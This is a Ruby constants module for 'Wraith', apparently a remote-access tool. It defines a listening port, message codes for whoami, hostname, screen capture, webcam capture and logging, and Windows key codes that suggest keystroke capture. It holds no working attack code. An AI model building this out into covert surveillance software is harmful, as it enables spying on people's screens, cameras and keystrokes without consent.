require 'jruby'

module Wraith
  
  # CONFIGURATION
  # Default port on which server listens
  DEFAULT_PORT         =   22022
  
  # MESSAGES
  # Connect and disconnect operations' values
  CONNECT_MESSAGE      =   "\x00\x00"
  DISCONNECT_MESSAGE   =   "\xFF\xFF"
  # General operations' values
  AUTHENTICATE_MESSAGE =   "\x01\x00"
  LOG_MESSAGE          =   "\x01\x01"
  WHOAMI_MESSAGE       =   "\x01\x02"
  HOSTNAME_MESSAGE     =   "\x01\x03"
  SCREEN_MESSAGE       =   "\x01\x04"
  WEBCAM_MESSAGE       =   "\x01\x05"

  # KEY CODES
  LEFT_SHIFT           =   0x000000A0
  RIGHT_SHIFT          =   0x000000A1
  LEFT_CONTROL         =   0x000000A2
  RIGHT_CONTROL        =   0x000000A3
  LEFT_ALT             =   0x000000A4
  RIGHT_ALT            =   0x000000A5
  CAPS_LOCK            =   0x00000014
  WINDOWS              =   0x0000005B
  BACK_TICK            =   0x000000C0
  EQUALS               =   0x000000BB
  MINUS                =   0x000000BD
  ZERO                 =   0x00000030
  ONE                  =   0x00000031
  TWO                  =   0x00000032
  THREE                =   0x00000033
  FOUR                 =   0x00000034
  FIVE                 =   0x00000035
  SIX                  =   0x00000036
  SEVEN                =   0x00000037
  EIGHT                =   0x00000038
  NINE                 =   0x00000039
  A                    =   0x00000041
  Z                    =   0x0000005A
  SPACE                =   0x00000020
  COMMA                =   0x000000BC
  DOT                  =   0x000000BE
  SLASH                =   0x000000BF
  SEMICOLON            =   0x000000BA
  APOSTROPHE           =   0x000000DE
  LEFT_BRACKET         =   0x000000DB
  RIGHT_BRACKET        =   0x000000DD
  BACK_SPACE           =   0x00000008
  TAB                  =   0x00000009
  ENTER                =   0x0000000D
  ESC                  =   0x0000001B
  F1                   =   0x00000070
  F12                  =   0x0000007B

end